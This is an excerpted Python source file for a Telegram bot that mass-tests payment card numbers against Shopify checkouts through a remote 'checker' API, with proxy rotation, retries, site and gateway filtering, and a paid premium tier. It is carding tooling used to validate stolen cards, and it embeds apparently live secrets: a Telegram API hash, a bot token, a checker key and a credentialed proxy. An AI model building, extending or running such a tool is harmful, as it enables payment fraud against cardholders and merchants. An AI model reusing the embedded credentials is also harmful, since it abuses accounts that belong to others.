...
API_ID = 38761139
API_HASH = 'd4c6180e88e80354f802d55ab727512f'
BOT_TOKEN = '8965858517:AAGjDZoOTg65r60TA96gBcsl27FjoNKGs2M'
ADMIN_ID = [8093002631]
API_SERVERS = [
    'https://api-production-6b6d.up.railway.app',
]
CHECKER_API_URL = 'https://api-production-6b6d.up.railway.app/shopify'
CHECKER_API_KEY = "darkanon"
SITE_API_URL = 'https://api-production-6b6d.up.railway.app/check'
DEFAULT_PROXY = '154.209.140.231:63152:PtGxCE51P:PRdtKb6cf'
...
bot = TelegramClient('checker_bot', API_ID,
...
def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline('<tg-emoji emoji-id="4904936030232117798"> Cᴍᴅ</tg-emoji>', b"show_cmds"),
         Button.inline('<tg-emoji emoji-id="5361734213370396027"> Tᴏᴏls</tg-emoji>', b"tools_menu")],
        [Button.url('<tg-emoji emoji-id="5445408306669582934"> Cʜᴀɴɴᴇʟ</tg-emoji>', "https://t.me/stripebinssss")]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline('<tg-emoji emoji-id="6266995104687330978"> Aᴅᴍɪɴ Pᴀɴᴇʟ</tg-emoji>', b"admin_panel")])
    return buttons
...
async def check_card(card, site, proxy):
    try:
        ...
        api_base = random.choice(API_SERVERS)
        url = f'{api_base}/shopify?site={site}&key={CHECKER_API_KEY}&proxy={proxy_str}&cc={card}'
...
async def check_card_with_retry(card, sites, proxies, max_retries=6):
    if not sites:
    ...
    return {'status': 'Site Error', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
...
async def test_site_with_price(site, proxy):
    try:
        ...
        if not proxy_str:
            proxy_str = DEFAULT_PROXY
        api_base = random.choice(API_SERVERS)
        url = f'{api_base}/check?site={site}&key={CHECKER_API_KEY}&proxy={proxy_str}'
        ...
        gateway = raw.get('gate', raw.get('Gate', raw.get('Gateway', 'Shopify Payments')))
...
async def test_proxy(proxy):
    try:
        ...
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
...
💡 Mᴀᴅᴇ ʙʏ  @Asifsakhani786"""
    ...
    filename = f"darkA{timestamp}.txt"
...
async def process_file_with_filters(event, user_id):
    ...
    try:
        ...
        for i, f in enumerate(gateway_filters):
            ...
            ), style="primary", icon=5348503265967355284))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
        ...
        buttons.append([Button.inline("  Cᴀɴᴄᴇʟ", b"cancel_filter",
                       style="danger", icon=5447647474984449520)])
        await event.reply(
            premium_emoji(
        ...
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                ...
                if not current_sites or not current_proxies:
                    break
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=6)
...
@bot.on(events.NewMessage(pattern=r'/(addproxy|addproxies)'))
async def add_proxy_command(event):
    ...
    try:
        ...
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ Usᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ ᴡɪᴛʜ <code>/addproxy</code> OR ᴘᴀsᴛᴇ ᴘʀᴏxɪᴇs ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ."), parse_mode='html')
            return
...
async def get_all_proxies(event):
    ...
    if len(current_proxies) <= 50:
        proxy_list = "\n".join(
            [f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
...
@bot.on(events.NewMessage(pattern=r'/(site|chksites|cleansites)'))
async def site_command(event):
    ...
    try:
        for i in range(0, len(sites), batch_size):
            ...
            tasks = [test_site_with_price(
                site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                    sites_with_price.append(
                        {'url': res['site'], 'price': res.get('price', 0.0)})
                else:
...
@bot.on(events.NewMessage(pattern=r'/(addsites|addsite)'))
async def add_sites_command(event):
    ...
    try:
        ...
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            tasks = [test_site_with_price(
                site, random.choice(proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
...
async def list_premium_command(event):
    ...
    if not premium_users:
        ...
        return
    premium_list = "\n".join(
        [f"• <code>{uid}</code>" for uid in premium_users])
...
async def id_command(event):
    ...
    plan = "⭐ Pʀᴇᴍɪᴜᴍ" if is_prem else "🆓 Fʀᴇᴇ"
...
▸ 👑 Pʟᴀɴ · {plan}
━━━━━━━━━━━━━━━━━━"""
    await event.reply(premium_emoji(id_text), parse_mode='html')
                        ...
                        if resp2.status == 200:
                            ...
                            if country_data and isinstance(country_data, list) and len(country_data) > 0:
                                country_name = country_data[0].get(
                                    'name', {}).get('common', country_code_upper)
                                # لو العلم مش موجود في FLAGS، نجيبه من API
                                if flag == '◻️':
                                    flag = country_data[0].get(
                                        'flags', {}).get('emoji', '🏳️')
                except:
                    pass
